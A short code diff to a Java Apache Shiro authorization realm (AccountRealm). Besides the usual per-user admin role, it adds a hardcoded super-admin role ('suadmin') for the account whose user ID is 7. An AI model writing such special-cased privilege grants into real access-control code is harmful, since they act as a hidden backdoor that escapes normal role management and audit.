@@ -38,6 +38,9 @@ public class AccountRealm extends AuthorizingRealm {
                 SimpleAuthorizationInfo info = new SimpleAuthorizationInfo();
                 Set<String> roleNames = new HashSet<>();
                 roleNames.add("admin_" + user.getId());
+                if(user.getId() == 7){
+                    roleNames.add("suadmin");
+                }
                 Set<String> permissionNames = new HashSet<String>();
 
                 // 将权限提供给info
